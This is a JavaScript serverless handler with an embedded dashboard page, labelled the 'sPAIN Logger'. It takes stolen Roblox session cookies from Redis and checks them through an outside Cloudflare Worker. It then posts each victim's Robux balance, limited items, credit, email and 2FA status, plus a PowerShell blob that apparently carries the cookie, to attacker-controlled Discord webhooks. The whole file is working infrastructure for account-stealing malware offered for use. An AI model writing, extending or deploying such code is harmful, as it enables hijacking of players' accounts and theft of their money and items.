// api/refresh.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string') { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getWorkerInfo(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, lang = 'powershell') {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    await discordSend(url, {
      content: first
        ? `\`\`\`${lang}\n${chunk}${rem.length === 0 ? '\n```' : ''}`
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

async function sendToDiscord(webhookUrl, info, pageName) {
  const now = new Date().toISOString();
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `🧑 ${info.username} ${info.isPremium ? '⭐' : ''}`,
      description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${info.id}/profile)`,
      color:       0xc026d3,
      thumbnail:   { url: info.avatarUrl },
      fields: [
        { name: '💰 Robux',         value: `\`${fmt(info.robux)} R$\``,                                                                     inline: true  },
        { name: '⏳ Pending',       value: `\`${fmt(info.pendingRobux)} R$\``,                                                              inline: true  },
        { name: '📊 Age',           value: `\`${info.accountAgeDays} days\``,                                                               inline: true  },
        { name: '📈 Today',         value: `\`${fmt(info.txDay)} R$\``,                                                                     inline: true  },
        { name: '📈 This Week',     value: `\`${fmt(info.txWeek)} R$\``,                                                                    inline: true  },
        { name: '📈 This Year',     value: `\`${fmt(info.txYear)} R$\``,                                                                    inline: true  },
        { name: '👥 Groups',        value: `Owned: \`${info.groupsOwned}\` | R$: \`${fmt(info.groupRobux)}\``,                              inline: true  },
        { name: '👥 Friends',       value: `\`${info.friends}\``,                                                                           inline: true  },
        { name: '🛒 Limiteds',      value: `Count: \`${info.limitedsCount}\` | RAP: \`${fmt(info.limitedsValue)} R$\``,                     inline: true  },
        { name: '💳 Credit',        value: `\`${info.credit} USD\``,                                                                        inline: true  },
        { name: '⭐ Premium',       value: `\`${info.isPremium ? 'Yes' : 'No'}\``,                                                          inline: true  },
        { name: '⚙️ Account',       value: `Email: ${info.emailSet}\n2FA: ${info.twoFA}`,                                                   inline: true  },
        { name: '🎮 Gamepasses',    value: `MM2: ${info.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${info.gamepasses?.adoptMe ? '✅' : '❌'} | PLS Donate: ${info.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '🕐 Refreshed At',  value: `\`${now}\``,                                                                                    inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName}` }
    }]
  });
  await discordChunked(webhookUrl, info.powershell, 'powershell');
}

// ── Dashboard page — shows live account info, refresh button ─────────────────
function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools — Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--surface:#0f0f18;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78;--green:#22c55e}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;padding:24px}
  body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:0.5}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.1}
  .blob1{width:600px;height:600px;background:var(--accent);top:-100px;left:-100px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-80px;right:-80px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(40px,25px)}}
  .container{position:relative;z-index:2;max-width:760px;margin:0 auto}
  .header{display:flex;align-items:center;gap:16px;margin-bottom:28px}
  .avatar{width:72px;height:72px;border-radius:50%;border:2px solid rgba(192,38,211,0.4);box-shadow:0 0 24px rgba(192,38,211,0.3);background:#1a1a2e;object-fit:cover;flex-shrink:0}
  .avatar-placeholder{width:72px;height:72px;border-radius:50%;border:2px solid rgba(90,90,120,0.3);background:#0d0d1a;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.8rem}
  .user-info h1{font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:900;letter-spacing:-0.02em}
  .user-info h1 span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  .user-meta{color:var(--muted);font-size:0.8rem;margin-top:4px;letter-spacing:0.04em}
  .badge{display:inline-flex;align-items:center;gap:5px;background:rgba(192,38,211,0.1);border:1px solid rgba(192,38,211,0.25);border-radius:100px;padding:3px 10px;font-size:0.62rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#e879f9;margin-left:8px}
  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}
  .stat-card{background:var(--card);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:18px 20px;position:relative;overflow:hidden;transition:border-color 0.2s}
  .stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2));opacity:0.5}
  .stat-label{font-size:0.68rem;font-weight:600;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);margin-bottom:6px}
  .stat-value{font-family:'Orbitron',sans-serif;font-size:1.15rem;font-weight:700;color:var(--text)}
  .stat-value.green{color:var(--green)}
  .stat-value.cyan{color:var(--accent3)}
  .section{background:var(--card);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:22px 24px;margin-bottom:14px;position:relative;overflow:hidden}
  .section::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent2),var(--accent3));opacity:0.4}
  .section-title{font-family:'Orbitron',sans-serif;font-size:0.68rem;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);margin-bottom:14px}
  .row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
  .row:last-child{border-bottom:none}
  .row-label{font-size:0.82rem;color:var(--muted)}
  .row-value{font-size:0.88rem;font-weight:600;color:var(--text)}
  .pass-grid{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
  .pass-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);border-radius:8px;padding:6px 12px;font-size:0.75rem;font-weight:600;letter-spacing:0.05em}
  .pass-item.owned{border-color:rgba(34,197,94,0.3);color:var(--green)}
  .pass-item.not-owned{color:var(--muted)}
  .actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:18px}
  .btn{width:100%;padding:16px 0;border:none;border-radius:12px;font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s,opacity 0.15s}
  .btn:hover{transform:translateY(-2px)}
  .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
  .btn-refresh{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;box-shadow:0 0 30px rgba(192,38,211,0.35)}
  .btn-refresh:hover{box-shadow:0 0 50px rgba(192,38,211,0.6)}
  .btn-discord{background:linear-gradient(135deg,#5865f2,#4752c4);color:#fff;box-shadow:0 0 30px rgba(88,101,242,0.35)}
  .btn-discord:hover{box-shadow:0 0 50px rgba(88,101,242,0.6)}
  .status-bar{margin-top:14px;text-align:center;font-size:0.72rem;color:var(--muted);letter-spacing:0.06em;min-height:20px}
  .status-bar.ok{color:var(--green)}
  .status-bar.err{color:#f472b6}
  .loading{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:60vh;gap:16px}
  .spinner{width:44px;height:44px;border:3px solid rgba(192,38,211,0.15);border-top-color:var(--accent);border-radius:50%;animation:spin 0.8s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .loading-text{font-family:'Orbitron',sans-serif;font-size:0.7rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted)}
  .error-card{background:rgba(255,58,92,0.05);border:1px solid rgba(255,58,92,0.2);border-radius:14px;padding:32px;text-align:center}
  .error-card h2{font-family:'Orbitron',sans-serif;font-size:1rem;color:#f472b6;margin-bottom:10px}
  .error-card p{color:var(--muted);font-size:0.85rem;line-height:1.6}
  #app{display:none}
  #loading-screen{display:flex}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>

<div class="container">
  <div id="loading-screen" class="loading">
    <div class="spinner"></div>
    <div class="loading-text">Fetching account info...</div>
  </div>

  <div id="app"></div>
</div>

<script>
const REFRESH_ID = '${id}';

async function loadInfo() {
  try {
    const r = await fetch('/api/refresh?id=' + REFRESH_ID + '&action=info');
    const d = await r.json();
    document.getElementById('loading-screen').style.display = 'none';
    const app = document.getElementById('app');
    app.style.display = 'block';
    if (!d.valid) {
      app.innerHTML = '<div class="error-card"><h2>Cookie Invalid or Expired</h2><p>' + (d.error || 'The cookie no longer works.') + '</p></div>';
      return;
    }
    renderDashboard(d);
  } catch (e) {
    document.getElementById('loading-screen').style.display = 'none';
    document.getElementById('app').innerHTML = '<div class="error-card"><h2>Network Error</h2><p>Could not reach the server.</p></div>';
    document.getElementById('app').style.display = 'block';
  }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

function renderDashboard(info) {
  const app = document.getElementById('app');
  app.innerHTML = \`
    <div class="header">
      \${info.avatarUrl
        ? \`<img class="avatar" src="\${info.avatarUrl}" onerror="this.style.display='none'">\`
        : '<div class="avatar-placeholder">🧑</div>'}
      <div class="user-info">
        <h1>s<span>PAIN</span> Tools \${info.isPremium ? '<span class="badge">⭐ Premium</span>' : ''}</h1>
        <div class="user-meta">@\${info.username} · ID: \${info.id} · \${info.accountAgeDays} days old</div>
      </div>
    </div>

    <div class="grid">
      <div class="stat-card">
        <div class="stat-label">💰 Robux</div>
        <div class="stat-value">\${fmt(info.robux)}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">⏳ Pending</div>
        <div class="stat-value cyan">\${fmt(info.pendingRobux)}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">🛒 RAP</div>
        <div class="stat-value">\${fmt(info.limitedsValue)}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">📈 Today</div>
        <div class="stat-value green">\${fmt(info.txDay)}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">📈 This Week</div>
        <div class="stat-value green">\${fmt(info.txWeek)}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">📈 This Year</div>
        <div class="stat-value green">\${fmt(info.txYear)}</div>
      </div>
    </div>

    <div class="section">
      <div class="section-title">Account Details</div>
      <div class="row"><span class="row-label">👥 Friends</span><span class="row-value">\${info.friends}</span></div>
      <div class="row"><span class="row-label">👥 Groups Owned</span><span class="row-value">\${info.groupsOwned}</span></div>
      <div class="row"><span class="row-label">🏦 Group R$</span><span class="row-value">\${fmt(info.groupRobux)}</span></div>
      <div class="row"><span class="row-label">💳 Credit</span><span class="row-value">\${info.credit} USD</span></div>
      <div class="row"><span class="row-label">📧 Email</span><span class="row-value">\${info.emailSet}</span></div>
      <div class="row"><span class="row-label">🔒 2FA</span><span class="row-value">\${info.twoFA}</span></div>
    </div>

    <div class="section">
      <div class="section-title">🎮 Gamepasses</div>
      <div class="pass-grid">
        <div class="pass-item \${info.gamepasses?.mm2 ? 'owned' : 'not-owned'}">\${info.gamepasses?.mm2 ? '✅' : '❌'} Murder Mystery 2</div>
        <div class="pass-item \${info.gamepasses?.adoptMe ? 'owned' : 'not-owned'}">\${info.gamepasses?.adoptMe ? '✅' : '❌'} Adopt Me</div>
        <div class="pass-item \${info.gamepasses?.plsDonate ? 'owned' : 'not-owned'}">\${info.gamepasses?.plsDonate ? '✅' : '❌'} PLS DONATE</div>
      </div>
    </div>

    <div class="actions">
      <button class="btn btn-refresh" onclick="refreshInfo()">🔄 Refresh Info</button>
      <button class="btn btn-discord" onclick="sendToDiscord()">📤 Send to Discord</button>
    </div>
    <div class="status-bar" id="statusBar"></div>
  \`;
}

async function refreshInfo() {
  document.getElementById('app').style.display = 'none';
  document.getElementById('loading-screen').style.display = 'flex';
  await loadInfo();
}

async function sendToDiscord() {
  const btns = document.querySelectorAll('.btn');
  btns.forEach(b => b.disabled = true);
  const st = document.getElementById('statusBar');
  st.className = 'status-bar';
  st.textContent = 'Sending to Discord...';
  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: REFRESH_ID })
    });
    const d = await r.json();
    if (d.success) {
      st.className = 'status-bar ok';
      st.textContent = '✓ Full info + PowerShell sent to your Discord!';
    } else {
      st.className = 'status-bar err';
      st.textContent = d.error || 'Something went wrong.';
    }
  } catch {
    st.className = 'status-bar err';
    st.textContent = 'Network error. Try again.';
  } finally {
    btns.forEach(b => b.disabled = false);
  }
}

loadInfo();
</script>
</body>
</html>`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const urlObj    = new URL('http://x' + req.url);
  const refreshId = urlObj.searchParams.get('id') || '';
  const action    = urlObj.searchParams.get('action') || '';

  if (!refreshId) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(400).send('<h1>Missing id</h1>');
  }

  // GET ?action=info — fetch live account info from Worker (called by the page JS)
  if (req.method === 'GET' && action === 'info') {
    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) return res.status(404).json({ valid: false, error: 'Link not found or expired' });
    const info = await getWorkerInfo(record.cookie);
    if (!info)  return res.status(200).json({ valid: false, error: 'Cookie invalid or expired' });
    return res.status(200).json(info);
  }

  // GET — serve the dashboard page
  if (req.method === 'GET') {
    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<div style="font-family:sans-serif;padding:40px;color:#f0f0f8;background:#080810;min-height:100vh"><h1 style="color:#f472b6">Link expired or not found</h1></div>');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(refreshId));
  }

  // POST — send full info + PowerShell to Discord
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    const postId = body?.id || refreshId;

    const record = await redisGet(`refresh:${postId}`);
    if (!record)        return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });

    const info = await getWorkerInfo(record.cookie);
    if (!info)          return res.status(502).json({ error: 'Cookie invalid or expired' });

    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    await Promise.all(webhooks.map(wh => sendToDiscord(wh, info, record.pageName || postId)));

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
